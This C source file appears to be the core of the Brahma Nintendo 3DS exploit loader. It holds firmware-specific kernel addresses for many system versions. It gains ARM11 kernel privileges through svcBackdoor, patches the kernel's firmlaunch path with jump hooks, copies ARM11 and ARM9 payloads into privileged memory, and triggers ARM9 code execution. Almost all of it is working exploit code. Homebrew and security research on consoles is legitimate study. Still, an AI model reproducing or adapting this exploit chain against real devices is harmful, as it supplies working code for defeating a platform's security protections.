#include <stdlib.h>
#include <stdio.h>
#include "gspgpu.h"
#include "brahma.h"
#include "exploitdata.h"
#include "libctru/types.h"
#include "libctru/fs.h"
#include "libctru/svc.h"

#define SYSTEM_VERSION(major, minor, revision) \
	(((major)<<24)|((minor)<<16)|((revision)<<8))


u32 *g_ext_arm9_buf;
u64 g_ext_arm9_size;
static bool g_ext_arm9_loaded;
static exploit_data g_expdata;
static struct arm11_shared_data g_arm11shared;
static bool is_N3DS;
GSPGPU_FramebufferInfo topFramebufferInfo, bottomFramebufferInfo;
u32 fb[3];

/* should be the very first call. allocates heap buffer
   for ARM9 payload */
Result brahma_init(void) {
	//g_ext_arm9_buf = memalign(0x1000, ARM9_PAYLOAD_MAX_SIZE);
	Result ret = svcControlMemory((u32*)&g_ext_arm9_buf, 0, 0, ARM9_PAYLOAD_MAX_SIZE, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
	return ret;
}

/* call upon exit */
u32 brahma_exit (void) {
	return 1;
}

/* overwrites two instructions (8 bytes in total) at src_addr
   with code that redirects execution to dst_addr */
void redirect_codeflow (u32 *dst_addr, u32 *src_addr) {
	*(src_addr + 1) = dst_addr;
	*src_addr = ARM_JUMPOUT;
}

Result fill_firm_specific(bool isN3DS, u32 fversion, exploit_data *data)
{
	Result res = 1;
	switch(fversion)
	{
		case 0x022E0000:
		{
			if(isN3DS)
			{	
				data->firm_version = 0x022E0000;
				data->sys_model = SYS_MODEL_NEW_3DS;
				data->va_patch_hook1 = 0xDFFE7A50;        // VA of 1st hook for firmlaunch
				data->va_patch_hook2 = 0xDFFF4994;        // VA of 2nd hook for firmlaunch
				data->va_hook1_ret = 0xFFF28A58;        // VA of return address from 1st hook 
				data->va_fcram_base = 0xE0000000;       // VA of FCRAM
				data->va_exc_handler_base_W = 0xDFFF4000;        // VA of lower mapped exception handler base
				data->va_exc_handler_base_X = 0xFFFF0000;        // VA of upper mapped exception handler base
				data->va_kernelsetstate = 0xFFF158F8;        // VA of the KernelSetState syscall (upper mirror)
				data->va_pdn_regs = 0xFFFBE000;        // VA PDN registers
				data->va_pxi_regs = 0xFFFC0000;        // VA PXI registers
			}
			else
			{
				data->firm_version = 0x022E0000;
				data->sys_model = SYS_MODEL_OLD_3DS;
				data->va_patch_hook1 = 0xDFFE59D0;
				data->va_patch_hook2 = 0xDFFF4974;
				data->va_hook1_ret = 0xFFF279D8;
				data->va_fcram_base = 0xE0000000;
				data->va_exc_handler_base_W = 0xDFFF4000;
				data->va_exc_handler_base_X = 0xFFFF0000;
				data->va_kernelsetstate = 0xFFF151C0;
				data->va_pdn_regs = 0xFFFC2000;
				data->va_pxi_regs =0xFFFC4000;
			}
			break;			
		}
		
		case 0x022C0600:
		{
			if(isN3DS)
			{
				data->firm_version = 0x022C0600;
				data->sys_model = SYS_MODEL_NEW_3DS;
				data->va_patch_hook1 = 0xDFFE7A50;
				data->va_patch_hook2 = 0xDFFF4994;
				data->va_hook1_ret = 0xFFF28A58; 
				data->va_fcram_base = 0xE0000000;
				data->va_exc_handler_base_W = 0xDFFF4000;
				data->va_exc_handler_base_X = 0xFFFF0000;
				data->va_kernelsetstate = 0xFFF158F8;
				data->va_pdn_regs = 0xFFFBE000;
				data->va_pxi_regs = 0xFFFC0000;	
			}
			else
			{
				data->firm_version = 0x022C0600;
				data->sys_model = SYS_MODEL_OLD_3DS;
				data->va_patch_hook1 = 0xDFFE4F28;
				data->va_patch_hook2 = 0xDFFF4974;
				data->va_hook1_ret = 0xFFF66F30; 
				data->va_fcram_base = 0xE0000000;
				data->va_exc_handler_base_W = 0xDFFF4000;
				data->va_exc_handler_base_X = 0xFFFF0000;
				data->va_kernelsetstate = 0xFFF54BAC;
				data->va_pdn_regs = 0xFFFBE000;
				data->va_pxi_regs = 0xFFFC0000;	
			}
			break;
		}
		case 0x02220000:
		{
			data->firm_version = 0x02220000;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE4DD4;
			data->va_patch_hook2 = 0xEFFF497C;
			data->va_hook1_ret = 0xFFF84DDC; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF748C4;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		case 0x02230600:
		{
			data->firm_version = 0x02230600;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE55BC;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF765C4; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64B94;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		case 0x02280000:
		{
			data->firm_version = 0x02280000;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE5B30;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF76B38; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64AAC;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		case 0x02270400:
		{
			data->firm_version = 0x02270400;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE5B34;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF76B3C; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64AB0;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		case 0x02250000:
		{
			data->firm_version = 0x02250000;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE5AE8;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF76AF0; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64A78;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
	
			break;
		}
		
		case 0x02240000:
		{
			data->firm_version = 0x02240000;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE55B8;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF765C0; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64B90;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
	
			break;
		}
		
		case 0x02260000:
		{
			data->firm_version = 0x02260000;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE5AE8;
			data->va_patch_hook2 = 0xEFFF4978;
			data->va_hook1_ret = 0xFFF76AF0; 
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF64A78;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		case 0x022D0500:
		{
			data->firm_version = 0x022D0500;
			data->sys_model = SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xDFFE6E74;
			data->va_patch_hook2 = 0xDFFF4994;
			data->va_hook1_ret   = 0xFFF27E7C;
			data->va_fcram_base  = 0xE0000000;
			data->va_exc_handler_base_W = 0xDFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF15204;
			data->va_pdn_regs = 0xFFFBE000;
			data->va_pxi_regs = 0xFFFC0000;
			
			break;
		}
		
		case 0x2210400:
		{
			data->firm_version = 0x2210400;
			data->sys_model = SYS_MODEL_OLD_3DS | SYS_MODEL_NEW_3DS;
			data->va_patch_hook1 = 0xEFFE4DD8;
			data->va_patch_hook2 = 0xEFFF497C;
			data->va_hook1_ret = 0xFFF84DE0;
			data->va_fcram_base = 0xF0000000;
			data->va_exc_handler_base_W = 0xEFFF4000;
			data->va_exc_handler_base_X = 0xFFFF0000;
			data->va_kernelsetstate = 0xFFF748C8;
			data->va_pdn_regs = 0xFFFD0000;
			data->va_pxi_regs = 0xFFFD2000;
			
			break;
		}
		
		default:
			res = 0;
	}
	return res;
}
/* fills exploit_data structure with information that is specific
   to 3DS model and firmware version
   returns: 0 on failure, 1 on success */
s32 get_exploit_data (exploit_data *data) {
	u32 fversion = 0;
	s32 result = 0;

	if(!data)
		return result;

	fversion = (*(vu32*)0x1FF80000) & ~0xFF;
	

	result = fill_firm_specific(is_N3DS, fversion, data);
	return result;
}

/* get system dependent data and set up ARM11 structures */
s32 setup_exploit_data(void) {
	s32 result = 0;

	if (get_exploit_data(&g_expdata)) {
		/* copy data required by code running in ARM11 svc mode */
		g_arm11shared.va_hook1_ret = g_expdata.va_hook1_ret;
		g_arm11shared.va_pdn_regs = g_expdata.va_pdn_regs;
		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
		result = 1;
	}
	return result;
}

/* reads ARM9 payload from a given path.
   filename: full path of payload
   offset: offset of the payload
   max_psize: if > 0 max payload size (should be <= ARM9_MAX_PAYLOAD_SIZE)
   returns: 0 on failure, 1 on success */
Result load_arm9_payload_offset(char *filename, u32 offset, u32 max_psize) {
	Handle fsHandle, fileHandle;
	Result ret = 0;
	u32 maxsize;
	ret = fsInit(&fsHandle);
	maxsize = ARM9_PAYLOAD_MAX_SIZE;
	FS_archive sdmcArchive = (FS_archive){0x9, (FS_path){PATH_EMPTY, 1, (u8*)""}};
	ret = FSUSER_OpenFileDirectly(fsHandle, &fileHandle, sdmcArchive, FS_makePath(PATH_CHAR, filename), FS_OPEN_READ, FS_ATTRIBUTE_NONE);
	if(ret > 0) return ret;
	ret = FSFILE_GetSize(fileHandle, (u64*)&g_ext_arm9_size);
	if(g_ext_arm9_size > maxsize) return -1;
	if(ret > 0) return ret;
	ret = FSFILE_Read(fileHandle, NULL, offset, (u32*)g_ext_arm9_buf, g_ext_arm9_size);
	if(ret > 0) return ret;
	FSFILE_Close(fileHandle);
	svcCloseHandle(fsHandle);
	
	return 0;
}

/* copies ARM9 payload to FCRAM
   - before overwriting it in memory, Brahma creates a backup copy of
	 the mapped firm binary's ARM9 entry point. The copy will be stored
	 into offset 4 of the ARM9 payload during run-time.
	 This allows the ARM9 payload to resume booting the Nintendo firmware
	 code.
	 Thus, the format of ARM9 payload written for Brahma is the following:
	 - a branch instruction at offset 0 and
	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint) */
s32 map_arm9_payload(void) {
	void *src;
	volatile void *dst;

	u32 size = 0;
	s32 result = 0;

	dst = (void *)(g_expdata.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);

	src = g_ext_arm9_buf;
	size = g_ext_arm9_size;
	
	if (size >= 0 && size <= ARM9_PAYLOAD_MAX_SIZE) {
		memcpy(dst, src, size);
		result = 1;
	}

	return result;
}

s32 map_arm11_payload (void) {
	void *src;
	volatile void *dst;
	u32 size = 0;
	u32 offs;
	s32 result_a = 0;
	s32 result_b = 0;

	src = &arm11_start;
	dst = (void *)(g_expdata.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
	size = (u8 *)&arm11_end - (u8 *)&arm11_start;

	// TODO: sanitize 'size'
	if (size) {
		memcpy(dst, src, size);
		result_a = 1;
	}

	offs = size;
	src = &g_arm11shared;
	size = sizeof(g_arm11shared);

	dst = (u8 *)(g_expdata.va_exc_handler_base_W +
		  OFFS_EXC_HANDLER_UNUSED + offs);

	// TODO sanitize 'size'
	if (result_a && size) {
		memcpy(dst, src, size);
		result_b = 1;
	}

	return result_a && result_b;
}

u8 back_value;
void exploit_arm9_race_condition (void) {

	s32 (* const _KernelSetState)(u32, u32, u32, u32) =
		(void *)g_expdata.va_kernelsetstate;

	//__asm__ volatile ("clrex");

	s32 ret = map_arm11_payload();
	if(ret != 1){ back_value = 3; return; }
	ret = map_arm9_payload();
	if(ret != 1){ back_value = 4; return; }
		/* patch ARM11 kernel to force it to execute
		   our code (hook1 and hook2) as soon as a
		   "firmlaunch" is triggered */ 	
	redirect_codeflow((u32*)(g_expdata.va_exc_handler_base_X +
						  OFFS_EXC_HANDLER_UNUSED),
						  (u32*)g_expdata.va_patch_hook1);

	redirect_codeflow((u32*)(PA_EXC_HANDLER_BASE +
						  OFFS_EXC_HANDLER_UNUSED + 4),
						  (u32*)g_expdata.va_patch_hook2);

	CleanEntireDataCache();
	dsb();
	InvalidateEntireInstructionCache();

	// trigger ARM9 code execution through "firmlaunch"
	_KernelSetState(0, 0, 2, 0);
	// prev call shouldn't ever return
	
	return;
}

/* restore svcCreateThread code (not really required,
   but just to be on the safe side) */
s32 priv_firm_reboot (void) {
	__asm__ volatile ("cpsid aif");
	// Save the framebuffers for arm9
	u32 *save = (u32 *)(g_expdata.va_fcram_base + 0x3FFFE00);
	save[0] = fb[0];
   	save[1] = fb[1];
	save[2] = fb[2];

	// Working around a GCC bug to translate the va address to pa...
	save[0] += 0xC000000;  // (pa FCRAM address - va FCRAM address)
	save[1] += 0xC000000;
	save[2] += 0xC000000;
	
	exploit_arm9_race_condition();
	return 0;
}

/* perform firmlaunch. load ARM9 payload before calling this
   function. otherwise, calling this function simply reboots
   the handheld */
s32 firm_reboot (bool is_n3ds) {
	s32 fail_stage = 0;
	
	is_N3DS = is_n3ds;
	
	fb[0] = GSP_GetScreenFBADR(0);
	fb[1] = GSP_GetScreenFBADR(1);
	fb[2] = GSP_GetScreenFBADR(2);
	
	fail_stage++; /* platform or firmware not supported, ARM11 exploit failure */
	if (setup_exploit_data()) {
		//fail_stage++; /* failure while khaxing */
		fail_stage++; /* Firmlaunch failure, ARM9 exploit failure*/
		svcBackdoor(priv_firm_reboot);
	}
	

	/* we do not intend to return ... */
	return back_value;
}
